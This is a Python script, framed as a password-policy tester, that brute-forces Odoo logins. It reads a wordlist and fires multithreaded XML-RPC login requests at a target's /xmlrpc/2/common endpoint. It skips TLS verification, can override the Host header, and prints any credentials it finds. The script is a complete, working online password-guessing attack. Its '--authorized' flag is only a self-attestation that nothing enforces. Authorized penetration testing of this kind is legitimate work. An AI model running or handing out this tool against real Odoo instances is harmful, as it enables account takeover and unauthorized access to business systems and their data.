#!/usr/bin/env python3
"""
auth_resilience_tester.py -- Odoo XML-RPC Authentication Tester.
Tests password policy resilience against authorized Odoo instances.

Usage:
    python3 auth_resilience_tester.py --url https://target.lab --db mydb --user admin --wordlist passwords.txt --authorized
"""

import argparse
import sys
import threading
import xml.sax.saxutils as saxutils
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_wordlist(path):
    """Generator: yields one password at a time to save Android RAM."""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                pw = line.strip()
                if pw:
                    yield pw
    except OSError as e:
        sys.exit(f"[-] Cannot read wordlist: {e}")

def try_login(url, db, user, password, host_header, stop_event):
    
    esc_db = saxutils.escape(db)
    esc_user = saxutils.escape(user)
    esc_pw = saxutils.escape(password)
    
    xml_payload = f"""<?xml version='1.0'?>
    <methodCall>
        <methodName>login</methodName>
        <params>
            <param><value><string>{esc_db}</string></value></param>
            <param><value><string>{esc_user}</string></value></param>
            <param><value><string>{esc_pw}</string></value></param>
        </params>
    </methodCall>"""

    headers = {"Content-Type": "text/xml", "User-Agent": "Mozilla/5.0"}
    if host_header:
        headers["Host"] = host_header


    if stop_event.is_set():
        return None

    try:
        r = requests.post(f"{url}/xmlrpc/2/common", data=xml_payload,
                          headers=headers, timeout=10, verify=False)
        
        
        if "<fault>" in r.text:
            return None
        if "<int>" in r.text:
            stop_event.set()
            return password
    except requests.RequestException:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description="Odoo XML-RPC Auth Tester")
    parser.add_argument("--url", required=True, help="Base URL, e.g. https://target.lab")
    parser.add_argument("--db", required=True, help="Database name")
    parser.add_argument("--user", default="admin", help="Username (default: admin)")
    parser.add_argument("--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("--threads", type=int, default=5, help="Threads (default: 5, max 10)")
    parser.add_argument("--host", help="Optional Host header override")
    parser.add_argument("--authorized", action="store_true", required=True,
                        help="Confirm you have written authorization to test this target")
    args = parser.parse_args()


    threads = min(args.threads, 10)
    
    print(f"[*] Target: {args.url} (db: {args.db}, user: {args.user})")
    print(f"[*] Threads: {threads}")
    
    stop_event = threading.Event()
    found_password = None
    tested_count = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        for pw in read_wordlist(args.wordlist):
            if stop_event.is_set():
                break
            futures[executor.submit(try_login, args.url, args.db, args.user, pw, args.host, stop_event)] = pw

        for future in as_completed(futures):
            tested_count += 1
            result = future.result()
            if result:
                found_password = result
                break 

    if found_password:
        print(f"\n[+] SUCCESS: {args.user} / {found_password}\n")
    else:
        print(f"\n[-] Tested {tested_count} passwords. No valid password found.\n")

if __name__ == "__main__":
    main()
